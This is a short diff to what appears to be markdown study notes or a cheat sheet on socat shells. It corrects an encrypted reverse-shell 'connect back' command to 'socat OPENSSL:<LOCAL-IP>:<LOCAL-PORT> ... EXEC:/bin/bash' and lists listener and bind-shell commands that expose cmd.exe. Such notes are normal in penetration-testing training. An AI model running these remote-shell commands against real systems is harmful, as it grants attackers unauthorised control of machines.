@@ -82,7 +82,7 @@ right: compromised target
 `cat shell.key shell.crt > shell.pem`: merge the two created files into a single `.pem` file  
 `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`: set up a reverse shell listener  
 `verify=0`: not bother trying to validate  
-`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`: connect back  
+`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`: connect back  
 Bind shell  
 Target:
 `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
